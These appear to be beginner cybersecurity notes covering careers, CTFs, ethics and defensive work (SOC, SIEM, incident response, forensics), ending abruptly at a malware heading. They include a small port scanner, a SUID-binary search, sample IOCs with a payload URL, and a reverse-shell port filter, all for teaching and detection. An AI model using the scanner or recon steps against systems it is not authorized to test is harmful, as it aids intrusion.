docs.title: 🔐 Cybersecurity Basics Notes
docs.text:
"Security is not a product, but a process." — Bruce Schneier

Welcome to Cybersecurity Basics Notes — a structured, beginner-to-intermediate reference for Cybersecurity, covering everything from core concepts and networking fundamentals to web security, operating systems, and real-world attack & defense techniques.

docs.title: 🗺️ What's Inside
docs.text: # Section What You'll Learn 01 🛡️ Introduction to Cybersecurity Offensive vs defensive security, and careers in cyber 02 🌐 Network Fundamentals Networking basics, LAN, OSI model, packets, and frames 03 💻 Operating Systems Linux & Windows CLI, OS security concepts 04 🌍 Web Fundamentals How websites work, DNS, HTTP/HTTPS, and web request flow 05 ⚔️ Attacks & Defenses CIA triad, cryptography, hacker mindset, and defensive strategies

docs.title: 🚀 How to Use These Notes
docs.text:
New to cybersecurity?

Start with Introduction to Cybersecurity → Network Fundamentals → Operating Systems before moving into Web Fundamentals and Attacks & Defenses.

Already have some background?

Jump straight to Attacks & Defenses or Web Fundamentals depending on what you're revising.

Keep in mind

Every topic includes real examples, diagrams, and practical context — read them carefully, don't just skim the content.

docs.title: Careers in Cyber
docs.text: A comprehensive A–Z guide to understanding, entering, and growing in the cybersecurity profession.

docs.title: 1. Why Cybersecurity?
docs.text: Cybersecurity is one of the fastest-growing and most in-demand fields in the world. As digital transformation accelerates, organizations of every size face a relentless wave of threats — from ransomware and phishing to nation-state espionage and insider threats.

docs.title: Key Stats (as of 2025)
docs.text:
• 3.5 million+ unfilled cybersecurity jobs globally (ISC² estimates)
  • Average salary for a security professional: $100,000–$160,000 USD in the US
  • Every industry needs security — finance, healthcare, government, education, retail
  • Cyber attacks cost the global economy over $8 trillion per year
  • The field is recession-resistant — security is always a necessity

docs.title: Who Should Consider Cybersecurity?
docs.text:
• People who love problem-solving and puzzles
  • Those interested in technology, networks, and how things break
  • People who care about privacy, ethics, and protecting others
  • Career changers from IT, software development, law enforcement, military, or even psychology

docs.title: 2. Career Domains Overview
docs.text: Cybersecurity is not a single job — it's an ecosystem of specializations. Broadly, they fall into:

docs.title: Offensive Security (Red Team)
docs.text: Simulating attackers to find weaknesses before real attackers do. - Penetration Testing - Red Teaming - Exploit Development - Social Engineering

docs.title: Defensive Security (Blue Team)
docs.text: Detecting, responding to, and preventing attacks. - Security Operations (SOC) - Incident Response - Threat Hunting - Digital Forensics

docs.title: Purple Team
docs.text: Bridging offense and defense — offensive teams share findings directly with defenders to improve detection.

docs.title: Governance, Risk & Compliance (GRC)
docs.text: Ensuring organizations follow policies, laws, and industry standards. - Risk Management - Compliance & Auditing - Security Policy Writing - Privacy & Data Protection

docs.title: Security Engineering & Architecture
docs.text: Designing and building secure systems. - Cloud Security - Application Security (AppSec) - Network Security Engineering - Identity & Access Management (IAM)

docs.title: Research & Intelligence
docs.text: Discovering new vulnerabilities and tracking threat actors. - Malware Analysis - Vulnerability Research - Threat Intelligence - Reverse Engineering

docs.title: Foundational Technical Skills
docs.text:
• Networking — TCP/IP, DNS, HTTP/S, OSI model, routing, subnetting
  • Operating Systems — Linux (essential), Windows, macOS internals
  • Programming & Scripting — Python, Bash, PowerShell (at minimum)
  • Web Technologies — HTTP, HTML, JavaScript, APIs, cookies, sessions
  • Databases — SQL, NoSQL basics; SQL injection concepts
  • Virtualization — VMware, VirtualBox, containers (Docker)
  • Cloud — AWS/Azure/GCP fundamentals

docs.title: Security-Specific Knowledge
docs.text:
• Cryptography — AES, RSA, hashing, PKI, TLS/SSL
  • Authentication — OAuth, SAML, MFA, Kerberos, LDAP
  • Vulnerability Management — CVE, CVSS scoring, patch management
  • SIEM & Log Analysis — Splunk, ELK stack, log correlation
  • Firewalls & IDS/IPS — rule creation, traffic analysis
  • Malware Concepts — RATs, ransomware, rootkits, C2 infrastructure
  • MITRE ATT&CK Framework — adversary TTPs catalog
  • OWASP Top 10 — web application vulnerabilities
  • NIST / ISO 27001 — security frameworks and standards

docs.title: Offensive Skills
docs.text:
• Reconnaissance (passive/active)
  • Exploitation techniques
  • Post-exploitation and lateral movement
  • Password cracking and privilege escalation
  • Social engineering and phishing

docs.title: Defensive Skills
docs.text:
• Log analysis and SIEM correlation
  • Alert triage and investigation
  • Threat intelligence integration
  • Incident response procedures
  • Endpoint detection (EDR tools)
  • Network traffic analysis (Wireshark, Zeek)

docs.title: Relevant Degrees
docs.text:
• B.Sc. in Cybersecurity — purpose-built programs covering all domains
  • B.Sc. in Computer Science — strong foundation, widely respected
  • B.Sc. in Information Technology — practical IT focus
  • B.Sc. in Electrical/Computer Engineering — hardware and systems focus
  • M.Sc. in Cybersecurity / Information Security — for specialization
  • MBA with Cyber focus — for leadership/CISO track

docs.title: Is a Degree Required?
docs.text: No. Many successful cybersecurity professionals are self-taught or came from non-CS backgrounds. However: - Degrees help with government and cleared positions (which often require degrees) - Degrees can accelerate entry into larger enterprises - Certifications + labs + portfolio can substitute effectively in most private sector roles

docs.title: 8. Labs & Hands-On Practice
docs.text: Hands-on practice is the single most important thing you can do to build skills.

docs.title: Home Lab Setup
docs.text:

- Host machine with 16GB+ RAM
- Hypervisor: VirtualBox (free) or VMware Workstation
- VMs: Kali Linux, Parrot OS, Ubuntu, Windows Server, Windows 10
- Network: Internal-only host-only or NAT network
- Vulnerable VMs: Metasploitable2/3, DVWA, VulnHub machines

docs.title: 13. Programming & Scripting
docs.text: You do not need to be a developer, but coding skills will set you apart.

docs.title: Essential Languages
docs.text:
Python — The #1 language in security 

# Example: Simple port scanner
import socket
for port in range(1, 1025):
    s = socket.socket()
    s.settimeout(0.5)
    if s.connect_ex(('192.168.1.1', port)) == 0:
        print(f"Port {port} is open")
    s.close()

Bash — Linux automation and scripting 

# Example: Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

PowerShell — Windows administration and red team 

# Example: List running processes
Get-Process | Where-Object {$_.CPU -gt 100} | Select-Object Name, CPU

docs.title: Resume Tips
docs.text:
• Tailor your resume to the job description — use their keywords
  • Lead with a strong summary highlighting your specialization
  • Quantify achievements where possible ("Reduced alert backlog by 40%")
  • Include certifications prominently
  • List your home lab and personal projects
  • Include GitHub profile, blog, or CTF profiles (HTB/THM)
  • Keep it to 1–2 pages maximum

docs.title: Interview Preparation
docs.text:
• Understand the role's specific focus (red vs blue vs GRC)
  • Be ready to explain concepts out loud (OWASP, CIA triad, TCP handshake)
  • Practice common scenario questions: "Walk me through how you'd investigate a phishing email"
  • Do a technical walkthrough of a CTF machine or past project
  • Research the company's tech stack and industry threats

docs.title: 16. Building a Portfolio
docs.text: A portfolio proves you can do the work, even before your first job.

docs.title: What to Include
docs.text:
1. CTF write-ups — Document your methodology and findings from machines you've solved
  2. Home lab documentation — Set up a SIEM, document your environment
  3. Vulnerability research — Even on intentionally vulnerable apps
  4. Tools you've built — Scripts, automation, custom tools
  5. Bug bounty findings — Even low-severity submissions count
  6. Blog posts / write-ups — Explaining concepts demonstrates understanding
  7. GitHub repositories — Clean, commented code with READMEs

docs.text:

  • HackTheBox / TryHackMe profiles — Show your progress

docs.text:

  • Create a phishing simulation and document the campaign
  • Analyze a malware sample and write an analysis report

docs.title: 17. CTF (Capture the Flag)
docs.text: CTFs are hacking competitions where you solve challenges to find hidden "flags." They're one of the best ways to develop and demonstrate skills.

docs.title: Types of CTF Challenges
docs.text:
• Web — XSS, SQLi, SSRF, XXE, authentication bypass
  • Cryptography — Break ciphers, analyze weak implementations
  • Reverse Engineering — Analyze binaries, find flags in compiled code
  • Binary Exploitation (Pwn) — Buffer overflows, ROP chains
  • Forensics — Analyze packet captures, images, memory dumps
  • OSINT — Find information using public sources
  • Steganography — Find hidden data in files/images
  • Miscellaneous — Programming challenges, puzzles

docs.title: Where to Play CTFs
docs.text: Platform Style HackTheBox Machine-based (always active) TryHackMe Guided rooms + challenges PicoCTF Beginner-friendly, education-focused CTFtime.org Calendar of all active CTF competitions OverTheWire War game style, Linux focus pwn.college Binary exploitation and pwn root-me.org Wide variety of challenges

docs.title: Tips for CTFs
docs.text:
• Document everything — screenshots and notes as you go
  • Use walkthroughs after you've tried — don't spoil yourself too early
  • Specialize before going broad
  • Team up for competitions
  • Write up your solutions — even failed attempts

docs.title: 18. Bug Bounty Programs
docs.text: Bug bounty programs pay researchers to find and responsibly disclose vulnerabilities in their systems.

docs.title: How It Works
docs.text:
1. Register on a bug bounty platform
  2. Read the program's scope carefully (what's in/out of scope)
  3. Recon the target (within scope)
  4. Find and verify a vulnerability
  5. Write a clear, reproducible report
  6. Submit and wait for triage
  7. Receive payment (if valid and in scope)

docs.title: Getting Started in Bug Bounty
docs.text:
• Start with PortSwigger Web Security Academy — free labs covering all OWASP
  • Learn Burp Suite inside out
  • Begin with programs that have wide scope (VDPs — Vulnerability Disclosure Programs)
  • Focus on one vulnerability class at a time
  • Read disclosed bug bounty reports on HackerOne for inspiration

docs.title: The Law
docs.text:
• Computer Fraud and Abuse Act (CFAA) — US law; unauthorized access is criminal
  • Computer Misuse Act (1990) — UK equivalent
  • GDPR — EU privacy regulation affecting security professionals
  • HIPAA — US healthcare data law
  • PCI-DSS — Payment card industry standard

docs.title: Always Get Written Authorization
docs.text: Before any security testing: - Obtain signed Rules of Engagement (RoE) - Define scope clearly (IPs, domains, excluded systems) - Define timing and emergency contact procedures - Understand what "success" looks like and reporting obligations

docs.title: Responsible Disclosure
docs.text: If you find a vulnerability outside of a bug bounty program: 1. Don't exploit it beyond proof of concept 2. Don't disclose publicly before the vendor can fix it 3. Contact the organization's security team (check for security@ email or security.txt) 4. Give reasonable time to patch (90 days is industry standard — Google Project Zero) 5. Coordinate disclosure timing

docs.title: Ethics Code
docs.text:
• Never attack systems without explicit permission
  • Protect confidential data you encounter during testing
  • Don't share client data or vulnerabilities with third parties
  • Act in the best interest of the people whose systems you protect
  • Report ALL findings, not just the impressive ones

docs.title: 21. Burnout & Mental Health
docs.text: Cybersecurity can be intensely demanding, especially in incident response, SOC, and red team roles.

docs.title: Common Stressors
docs.text:
• On-call and after-hours incidents — breaches don't respect business hours
  • High-stakes decisions — errors have real consequences
  • Adversarial mindset 24/7 — always thinking about what can go wrong
  • Under-resourced teams — too much to protect, too few people
  • Imposter syndrome — the field is vast and evolves fast

docs.title: Warning Signs
docs.text:
• Constant fatigue despite sleeping
  • Cynicism about your work or organization
  • Difficulty concentrating
  • Feeling like your work doesn't matter
  • Physical symptoms (headaches, tension)

docs.title: Healthy Practices
docs.text:
• Set firm boundaries on after-hours work when possible
  • Rotate on-call responsibilities fairly within teams
  • Take real vacations — completely disconnected
  • Exercise and physical activity — essential for mental resilience
  • Community — connect with other security professionals
  • Pursue interests outside security — hobbies matter
  • Seek professional support if needed — many countries have EAP programs

docs.title: Industry Culture Note
docs.text: The "hacker" culture can sometimes glorify overwork and "hustling." Sustainable careers are built on balance, not burnout. Senior practitioners consistently advise: it's a marathon, not a sprint.

docs.title: Defensive Security Introduction 🏰
docs.text:
What You'll Learn

  • ✅ What Defensive Security is and why it matters
  • ✅ The Blue Team mindset — how defenders think
  • ✅ Security Operations Center (SOC) — structure & workflow
  • ✅ Threat Intelligence, SIEM, and log analysis
  • ✅ Incident Response — step-by-step process
  • ✅ Key defensive technologies & how they work
  • ✅ Digital Forensics & Malware Analysis
  • ✅ Hardening systems, networks & applications
  • ✅ Career paths, certifications & where to practice

docs.title: 📖 Introduction
docs.text:
Defensive Security is the practice of protecting systems, networks, and data from attacks. While offensive security tries to break in, defensive security focuses on detecting, preventing, and responding to threats.

Think of it this way

Defensive security is like running a hospital 🏥. You have guards at the door (firewalls), cameras everywhere (monitoring), doctors on call 24/7 (incident responders), and a plan for when something goes wrong (incident response). The goal is to keep everyone safe and respond fast when something bad happens.

Offensive vs Defensive Security

  • Offensive Security = The testers who find holes in the walls 🗡️
  • Defensive Security = The team that builds, monitors, and repairs those walls 🏰 Both sides are essential — a strong defense is built by understanding how attackers think.

Defence is Never 'Done'

Cyber threats evolve every day. New vulnerabilities, new malware, and new attack techniques emerge constantly. A good defender assumes they will be attacked and prepares accordingly. The question isn't if — it's when.

graph TD
    A[Defensive Security] --> B[Security Operations]
    A --> C[Threat Intelligence]
    A --> D[Incident Response]
    A --> E[Digital Forensics]
    A --> F[System Hardening]

    B --> B1[SOC — Monitor & Detect]
    B --> B2[SIEM & Log Analysis]
    B --> B3[Threat Hunting]

    C --> C1[IOCs & TTPs]
    C --> C2[MITRE ATT&CK Framework]
    C --> C3[Dark Web Monitoring]

    D --> D1[Preparation]
    D --> D2[Detection & Containment]
    D --> D3[Eradication & Recovery]

    E --> E1[Disk & Memory Forensics]
    E --> E2[Malware Analysis]
    E --> E3[Network Forensics]

    F --> F1[Patch Management]
    F --> F2[Firewall & IDS/IPS]
    F --> F3[Zero Trust Architecture]

docs.title: 🧠 The Defender's Mindset
docs.text:
Offensive security asks: "How can this be broken?" Defensive security asks: "How will I know when something is broken — and what do I do next?"

The Core Assumption

Assume Breach. Don't just try to keep attackers out — assume they may already be inside and design your defenses to detect, contain, and evict them quickly.

docs.title: The Defence-in-Depth Model
docs.text:
Defence-in-depth means layering multiple security controls so that if one layer fails, the next one catches the threat. No single tool or technique is enough.

Defence-in-Depth Layers:
┌──────────────────────────────────────────────────┐
│  Layer 7 — Policies & Procedures                 │
│  (Security policies, user training, compliance)  │
├──────────────────────────────────────────────────┤
│  Layer 6 — Physical Security                     │
│  (Locked server rooms, badge access, cameras)    │
├──────────────────────────────────────────────────┤
│  Layer 5 — Perimeter Security                    │
│  (Firewalls, DMZ, VPN, DDoS protection)          │
├──────────────────────────────────────────────────┤
│  Layer 4 — Network Security                      │
│  (IDS/IPS, network segmentation, VLANs)          │
├──────────────────────────────────────────────────┤
│  Layer 3 — Endpoint Security                     │
│  (Antivirus, EDR, host-based firewalls)          │
├──────────────────────────────────────────────────┤
│  Layer 2 — Application Security                  │
│  (Secure coding, WAF, input validation)          │
├──────────────────────────────────────────────────┤
│  Layer 1 — Data Security                         │
│  (Encryption, DLP, access control, backups)      │
└──────────────────────────────────────────────────┘
         ↑ If one layer fails, the next catches it

docs.title: The CIA Triad (What Defenders Protect)
docs.text: Goal What It Means Defensive Control 🔒 Confidentiality Only authorized people can read data Encryption, access control, MFA ✏️ Integrity Data is not tampered with Hashing, digital signatures, audit logs ⚡ Availability Systems stay online and accessible Backups, redundancy, DDoS protection

docs.title: 🏢 Security Operations Center (SOC)
docs.text:
A SOC is a centralized team of security professionals who monitor an organization's IT environment 24 hours a day, 7 days a week to detect and respond to threats.

Real-Life Analogy

A SOC is like the control room of an airport 🛫. Air traffic controllers watch dozens of radar screens, track every plane, communicate constantly, and respond immediately when something goes off course. The SOC does the same — but for network traffic and security events.

docs.title: SOC Team Structure
docs.text:
graph TD
    CISO[CISO — Chief Information Security Officer] --> SOCManager[SOC Manager]
    SOCManager --> T1[Tier 1 Analysts\nAlert Triage]
    SOCManager --> T2[Tier 2 Analysts\nDeep Investigation]
    SOCManager --> T3[Tier 3 Analysts\nThreat Hunting & Research]
    SOCManager --> IR[Incident Response Team]
    SOCManager --> TI[Threat Intelligence Team]
    SOCManager --> Forensics[Digital Forensics Team]
Role Responsibility Skills Needed Tier 1 Analyst Monitor alerts, triage, close false positives SIEM basics, networking, log reading Tier 2 Analyst Deep-dive investigations, correlate events Malware analysis, forensics, threat intel Tier 3 Analyst Proactive threat hunting, build detection rules Advanced forensics, reverse engineering IR Team Contain and recover from active incidents Incident response playbooks, forensics Threat Intel Research attacker TTPs, feed indicators to SIEM OSINT, dark web monitoring, reporting

docs.title: SOC Workflow
docs.text:
graph LR
    A[Alert Generated] --> B[Tier 1 Triages]
    B --> C{False Positive?}
    C -- Yes --> D[Close & Document]
    C -- No --> E[Tier 2 Investigates]
    E --> F{Confirmed Incident?}
    F -- No --> D
    F -- Yes --> G[Escalate to IR Team]
    G --> H[Containment]
    H --> I[Eradication & Recovery]
    I --> J[Post-Incident Review]

False Positive Problem

A large organization can generate millions of security alerts per day. The majority are false positives (harmless events flagged incorrectly). A skilled Tier 1 analyst quickly separates noise from real threats — this is one of the hardest parts of the job.

docs.title: 📊 SIEM — Security Information & Event Management
docs.text:
A SIEM is the central nervous system of a SOC. It collects logs from every device in the organization, correlates them, and generates alerts when suspicious patterns are detected.

Real-Life Analogy

Imagine every door, window, and camera in a building sending status updates to one security desk every second. The SIEM is that security desk — it reads everything, looks for patterns, and rings the alarm when something looks wrong.

How SIEM Works:
┌─────────────┐   ┌─────────────┐   ┌─────────────┐
│  Firewall   │   │  Web Server │   │  Windows PC │
│   Logs      │   │   Logs      │   │   Logs      │
└──────┬──────┘   └──────┬──────┘   └──────┬──────┘
       │                 │                 │
       └────────────┬────┘─────────────────┘
                    ▼
           ┌────────────────┐
           │   SIEM Engine  │  ← Collects, Normalizes & Correlates
           │  (Splunk/QRadar│
           │  /Elastic SIEM)│
           └───────┬────────┘
                   │
        ┌──────────┴──────────┐
        ▼                     ▼
  ┌──────────┐         ┌──────────────┐
  │  Alerts  │         │  Dashboards  │
  │  & Cases │         │  & Reports   │
  └──────────┘         └──────────────┘

docs.title: Reading Logs
docs.text:
Logs are the raw material of defensive security. Everything that happens on a system is recorded in a log.

Windows Event LogsLinux Auth LogsNetwork Logs (Firewall)Common SIEM Platforms 
Key Event IDs to Know:

4624  → Successful Login          ✅ Normal
4625  → Failed Login              ⚠️ Watch for repeated failures
4648  → Login with explicit creds ⚠️ Could be lateral movement
4720  → New user account created  ⚠️ Unauthorized account?
4732  → User added to Admin group 🚨 Privilege escalation!
4688  → New process created       ⚠️ Watch for cmd.exe, powershell
7045  → New service installed     🚨 Could be malware persistence
1102  → Audit log cleared         🚨 Attacker covering tracks!

# Location of key log files
/var/log/auth.log      → Authentication attempts
/var/log/syslog        → General system events
/var/log/apache2/      → Web server access & errors
/var/log/kern.log      → Kernel events

# Find failed SSH logins
grep "Failed password" /var/log/auth.log

# Find successful logins
grep "Accepted password" /var/log/auth.log

# Watch logs in real time
tail -f /var/log/auth.log

Sample Firewall Log Entry:
2025-01-15 03:22:11 | DENY | SRC=185.220.101.1 DST=10.0.0.5
                    | PROTO=TCP | SPT=54231 | DPT=22 | ...

What this tells us:
- Date/Time: 3am (suspicious — off-hours)
- Action: DENY (firewall blocked it)
- Source IP: 185.220.101.1 (external — check reputation!)
- Destination: 10.0.0.5 (internal server)
- Port 22: SSH — someone tried to connect remotely
- Finding: Blocked SSH brute-force attempt from external IP

Enterprise (Paid):
Splunk        → Most widely used, powerful query language (SPL)
IBM QRadar    → Enterprise SIEM with AI correlation
Microsoft Sentinel → Cloud-native SIEM on Azure

Open Source (Free):
Elastic SIEM (ELK Stack) → Elasticsearch + Logstash + Kibana
Wazuh         → Host-based IDS + SIEM capabilities
Graylog       → Log management and SIEM

docs.title: 🕵️ Threat Intelligence
docs.text:
Threat Intelligence is knowledge about attackers — who they are, what they want, and how they operate. This intelligence helps defenders prepare for and detect specific threats.

Types of Threat Intelligence

Type Audience Example Strategic Executives, CISO "Nation-state actors are targeting our industry" Tactical Security architects "Attackers are using phishing with fake invoice PDFs" Operational SOC analysts "IP 1.2.3.4 is actively scanning port 22" Technical Analysts, tools Malware hashes, malicious domains, IP blacklists

docs.title: Indicators of Compromise (IOCs)
docs.text:
IOCs are evidence that a system has been compromised. They are the digital fingerprints left by attackers.

Common IOC Types:
┌──────────────────┬─────────────────────────────────────────┐
│ IOC Type         │ Example                                 │
├──────────────────┼─────────────────────────────────────────┤
│ IP Address       │ 185.220.101.45 (known C2 server)        │
│ Domain           │ update-windows-security[.]com           │
│ URL              │ http://malicious.site/payload.exe       │
│ File Hash (MD5)  │ 5d41402abc4b2a76b9719d911017c592        │
│ File Hash (SHA256)│ e3b0c44298fc1c149afb...               │
│ File Name        │ svchost32.exe (fake Windows process)    │
│ Registry Key     │ HKLM\Software\Microsoft\Windows\Run\... │
│ Email Subject    │ "Urgent: Invoice #8821 Due Today"       │
└──────────────────┴─────────────────────────────────────────┘

docs.title: MITRE ATT&CK Framework
docs.text:
The MITRE ATT&CK framework is a globally-recognized knowledge base of attacker tactics and techniques based on real-world observations.

graph LR
    A[MITRE ATT&CK] --> B[Tactics - The WHY]
    A --> C[Techniques - The HOW]
    A --> D[Procedures - Specific Examples]

    B --> B1[Reconnaissance]
    B --> B2[Initial Access]
    B --> B3[Execution]
    B --> B4[Persistence]
    B --> B5[Privilege Escalation]
    B --> B6[Defense Evasion]
    B --> B7[Credential Access]
    B --> B8[Lateral Movement]
    B --> B9[Exfiltration]

Why ATT&CK Matters for Defenders

If you know an attacker group typically uses spear phishing for Initial Access and Mimikatz for Credential Access, you can: - Write SIEM rules to detect those specific techniques - Run tabletop exercises simulating that attack path - Prioritize defenses that block those exact methods

docs.title: Threat Intelligence Tools
docs.text: Tool Purpose VirusTotal Scan files/URLs/IPs against 70+ antivirus engines Shodan Find exposed devices; monitor your own attack surface AbuseIPDB Check if an IP has been reported for malicious activity AlienVault OTX Community-shared threat intelligence feeds MISP Open source threat intelligence sharing platform Any.run Interactive malware sandbox for behavioral analysis URLScan.io Analyze suspicious URLs safely

docs.title: 🚨 Incident Response (IR)
docs.text:
Incident Response is the structured process of handling a cyberattack or security breach. A fast, organized response limits damage, reduces recovery time, and preserves evidence.

Real-Life Analogy

Incident response is like the fire department 🚒. They don't just show up and spray water everywhere — they follow a precise process: assess the scene, contain the fire, put it out, make sure it doesn't restart, and then investigate the cause.

docs.title: The IR Lifecycle
docs.text:
graph LR
    A[1. Preparation] --> B[2. Detection & Analysis]
    B --> C[3. Containment]
    C --> D[4. Eradication]
    D --> E[5. Recovery]
    E --> F[6. Post-Incident Review]
    F --> A

docs.title: 1️⃣ Preparation
docs.text:
Build your defenses and response capabilities before an incident happens.

Preparation Checklist:
┌────────────────────────────────────────────────┐
│  📋 Incident Response Plan documented          │
│  📞 Contact list for IR team & stakeholders    │
│  🛠️ IR toolkit ready (forensic tools, etc.)   │
│  📦 Backups tested and stored offline          │
│  🔍 Logging enabled on all critical systems    │
│  🎭 Tabletop exercises conducted regularly     │
│  📜 Legal counsel & law enforcement contacts   │
│  🔐 Jumpbag ready (isolated response laptop)   │
└────────────────────────────────────────────────┘

Playbooks

A playbook is a pre-written step-by-step guide for responding to a specific type of incident (ransomware, data breach, phishing, insider threat). Having playbooks means responders don't waste precious time figuring out what to do next during a crisis.

docs.title: 2️⃣ Detection & Analysis
docs.text:
Identify that an incident has occurred and understand its scope.

Detection SourcesIncident Severity LevelsKey Questions to Answer 
Where incidents are typically discovered:

🔔 SIEM alert          → Automated rule fired
📧 User report         → "I clicked something weird..."
🤖 EDR / Antivirus     → Malware detected on endpoint
🌐 Threat Intelligence → IOC matched in network traffic
🔍 Threat Hunting      → Analyst proactively found anomaly
💼 External party      → Partner or researcher notifies you
🕵️ Attacker contact    → Ransomware note left on desktop

P1 — Critical 🔴
→ Active data breach, ransomware spreading, systems down
→ Response time: Immediately (within minutes)

P2 — High 🟠
→ Confirmed malware on endpoint, privileged account compromise
→ Response time: Within 1 hour

P3 — Medium 🟡
→ Phishing email opened, suspicious network traffic
→ Response time: Within 4 hours

P4 — Low 🟢
→ Policy violation, spam campaign, minor anomaly
→ Response time: Within 24 hours

During Detection & Analysis, answer these:

WHAT:  What type of incident is this?
       (Malware? Data breach? Insider threat? DDoS?)

WHEN:  When did it start? (Check logs for earliest evidence)

WHERE: Which systems are affected?
       (One machine? The whole domain? Cloud?)

WHO:   Which user account was involved?
       (Compromised credentials? Insider?)

HOW:   What was the initial entry point?
       (Phishing email? Unpatched vulnerability?)

SCOPE: How far has the attacker spread?
       (Lateral movement detected?)

docs.title: 3️⃣ Containment
docs.text:
Stop the attack from spreading further. Speed is critical here.

Short-Term ContainmentEvidence Preservation 
# Isolate infected machine from network immediately
# (On Windows — disable network adapter)
netsh interface set interface "Ethernet" admin=disable

# Block malicious IP at the firewall
iptables -A INPUT -s 185.220.101.1 -j DROP
iptables -A OUTPUT -d 185.220.101.1 -j DROP

# Disable compromised user account
net user john.doe /active:no          # Windows
usermod -L john.doe                   # Linux

# Reset compromised credentials
# Change passwords for affected accounts
# Revoke API keys, certificates, tokens

⚠️ Before wiping anything — preserve evidence!

Collect in this order (most volatile first):
1. RAM memory dump  → Running processes, encryption keys
2. Network connections → Active connections at time of incident
3. Running processes → What's currently executing
4. Disk image       → Full forensic copy of the hard drive
5. Log files        → Export before they rotate/are deleted

Tools:
- Volatility   → Memory forensics
- FTK Imager   → Disk imaging
- Wireshark    → Capture live network traffic
- Velociraptor → Enterprise-scale forensic collection

docs.title: 4️⃣ Eradication
docs.text:
Remove the threat completely from the environment.

Eradication Steps:
┌─────────────────────────────────────────────────┐
│  🔍 Identify root cause (how did they get in?)  │
│  🗑️ Remove malware, backdoors, web shells       │
│  👤 Delete attacker-created accounts            │
│  🔑 Rotate ALL compromised credentials          │
│  🔒 Patch the exploited vulnerability           │
│  🛡️ Update AV/EDR signatures                   │
│  🔎 Scan all systems for related IOCs           │
│  ✅ Verify no persistence mechanisms remain     │
└─────────────────────────────────────────────────┘

Don't Rush Eradication

Make sure you've found all of the attacker's footholds before eradicating. If you miss one backdoor, they'll be back inside within hours. Attackers often create multiple persistence mechanisms specifically for this scenario.

docs.title: 5️⃣ Recovery
docs.text:
Bring systems back online safely.

Recovery Process:
┌────────────────────────────────────────────────┐
│  1. Restore from clean backups (pre-infection) │
│  2. Rebuild compromised systems from scratch   │
│  3. Re-enable network connectivity in stages   │
│  4. Monitor closely for re-infection           │
│  5. Verify systems are functioning normally    │
│  6. Gradually restore full operations          │
│  7. Notify stakeholders of recovery status     │
└────────────────────────────────────────────────┘

docs.title: 6️⃣ Post-Incident Review (Lessons Learned)
docs.text:
After recovery, analyse what happened and improve your defenses.

The Most Important Phase Nobody Does

Most organizations skip this step. This is a mistake. The post-incident review is where you turn a bad event into a permanent improvement to your security posture.

Post-Incident Report Should Answer:
┌──────────────────────────────────────────────────────┐
│  📅 Timeline  → When did each event occur?           │
│  🚪 Root Cause → How did the attacker get in?        │
│  ⏱️ Detection  → How long were they undetected?      │
│  💰 Impact    → What was the business/data impact?   │
│  ✅ What Worked → What detections/controls helped?   │
│  ❌ What Failed → Where did our defences fall short? │
│  🔧 Action Items → What will we fix, and by when?    │
└──────────────────────────────────────────────────────┘

docs.title: 🔬 Digital Forensics
docs.text:
Digital Forensics is the process of collecting, preserving, and analyzing digital evidence — often after an incident — to understand what happened and potentially support legal action.

Real-Life Analogy

Digital forensics is like a crime scene investigation 🔍 but for computers. Just as a detective collects fingerprints and photographs without contaminating the scene, a digital forensic analyst collects evidence without altering the original data.

docs.title: The Forensic Process
docs.text:
graph LR
    A[Identification] --> B[Preservation]
    B --> C[Collection]
    C --> D[Analysis]
    D --> E[Reporting]

docs.title: Chain of Custody
docs.text:
Critical Concept

Chain of custody is the documented, unbroken trail of who collected, handled, transferred, and analyzed evidence. Without it, evidence is inadmissible in court. Every step must be logged with timestamps, names, and hashes.

Chain of Custody Log:
┌──────────────┬──────────────────┬─────────────────────┐
│  Date/Time   │  Person          │  Action             │
├──────────────┼──────────────────┼─────────────────────┤
│ 2025-01-15   │ Jane Smith (IR)  │ Seized hard drive   │
│ 09:15:32     │                  │ SHA256: abc123...   │
├──────────────┼──────────────────┼─────────────────────┤
│ 2025-01-15   │ Bob Jones (Fore.)│ Received from Jane  │
│ 11:30:00     │                  │ SHA256 verified ✅  │
└──────────────┴──────────────────┴─────────────────────┘

docs.title: Types of Forensics
docs.text:
Disk ForensicsMemory ForensicsNetwork ForensicsForensic Tools 
# Create forensic image (never work on original!)
dd if=/dev/sda of=/evidence/disk.img bs=4M
# Verify integrity with hash
sha256sum /dev/sda
sha256sum /evidence/disk.img
# Both hashes MUST match — proves image is unaltered

# Mount image read-only for analysis
mount -o ro,loop /evidence/disk.img /mnt/evidence

# Key areas to examine:
# - Deleted files (recovered with Autopsy/Sleuth Kit)
# - Browser history, cookies, cached data
# - Recently accessed files (MRU lists)
# - Prefetch files (shows what programs ran)
# - Registry (Windows) — user activity, installed software
# - $MFT (Master File Table) — full file system history

# Capture RAM with winpmem (Windows)
winpmem.exe memory.raw

# Analyse with Volatility3
# List running processes
python3 vol.py -f memory.raw windows.pslist

# Find network connections
python3 vol.py -f memory.raw windows.netstat

# Detect injected malicious code
python3 vol.py -f memory.raw windows.malfind

# Dump a suspicious process
python3 vol.py -f memory.raw windows.dumpfiles --pid 1234

# Why memory forensics matters:
# RAM contains: encryption keys, passwords, running malware,
# injected shellcode, network connections — all invisible on disk!

# Capture live traffic
tcpdump -i eth0 -w capture.pcap

# Analyse in Wireshark
# Useful filters:
http                    → All HTTP traffic
tcp.port == 4444        → Common reverse shell port
ip.addr == 192.168.1.5  → Traffic to/from specific IP
dns                     → All DNS queries (look for beaconing)
smtp                    → Email traffic

# Zeek (formerly Bro) — network monitoring framework
zeek -r capture.pcap    → Generate structured logs

# NetworkMiner — passive network forensics tool
# Reconstructs files transferred over the network

Disk & File Analysis:
Autopsy          → GUI forensics platform (free)
Sleuth Kit       → Command-line forensic toolkit
FTK Imager       → Disk imaging and evidence collection
Recuva           → Deleted file recovery

Memory Analysis:
Volatility 3     → Industry standard memory forensics
Rekall           → Memory analysis framework

Network Analysis:
Wireshark        → Packet analysis GUI
NetworkMiner     → Passive network forensics
Zeek             → Network traffic monitoring & logging
Arkime           → Full packet capture platform

All-in-One:
CAINE Linux      → Forensics-focused Linux distro
SIFT Workstation → SANS forensic toolkit (Ubuntu-based)

docs.title: 🦠 Malware Analysis
docs.text:
Malware Analysis is the process of studying malicious software to understand how it works, what it does, and how to detect and remove it.

Types of Malware

